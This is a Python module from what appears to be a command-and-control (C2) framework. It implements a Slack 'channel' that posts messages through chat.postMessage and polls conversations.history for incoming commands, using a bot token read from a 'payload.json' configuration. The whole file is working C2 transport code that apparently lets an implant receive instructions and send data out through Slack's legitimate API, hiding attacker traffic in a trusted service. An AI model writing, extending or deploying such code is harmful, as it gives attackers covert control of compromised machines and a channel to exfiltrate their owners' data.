"""Slack channel adapter (Web API over plain HTTPS).

Credentials: ``slack_bot_token`` plus ``slack_channel_id`` from
``payload.json``. Outbound uses ``chat.postMessage``; inbound polls
``conversations.history`` with an in-memory cursor, so no SDK is
required.
"""

from __future__ import annotations

import requests

from core.protocols import C2Message
from modules.c2_channels.base import HttpC2Channel

API_BASE = "https://slack.com/api"


class SlackC2Channel(HttpC2Channel):
    """Slack Web API transport (chat.postMessage + history polling)."""

    name = "slack"

    def __init__(self, config: dict) -> None:
        self._token = ""
        self._channel_id = ""
        self._history_cursor = ""
        super().__init__(config)

    def _resolve_credentials(self) -> bool:
        self._token = str(self._config.get("slack_bot_token", "") or "").strip()
        self._channel_id = str(self._config.get("slack_channel_id", "") or "").strip()
        return bool(self._token) and bool(self._channel_id)

    def _headers(self) -> dict[str, str]:
        return {"Authorization": f"Bearer {self._token}"}

    def _send_request(self, text: str) -> requests.Response:
        return requests.post(  # noqa: S113
            f"{API_BASE}/chat.postMessage",
            headers=self._headers(),
            json={"channel": self._channel_id, "text": text},
            timeout=10.0,
        )

    def _poll_request(self, limit: int) -> list[C2Message]:
        response = requests.get(  # noqa: S113
            f"{API_BASE}/conversations.history",
            headers=self._headers(),
            params={"channel": self._channel_id, "limit": limit, "latest": self._history_cursor},
            timeout=15.0,
        )
        body = response.json()
        entries = body.get("messages", []) if isinstance(body, dict) else []
        messages: list[C2Message] = []
        for entry in reversed(entries):
            if entry.get("subtype"):
                continue
            text = str(entry.get("text", "") or "")
            sender = str(entry.get("user", "") or "")
            ts = str(entry.get("ts", "") or "")
            if ts:
                self._history_cursor = ts
            if text and sender:
                messages.append(C2Message(channel=self.name, sender=sender, text=text))
        return messages
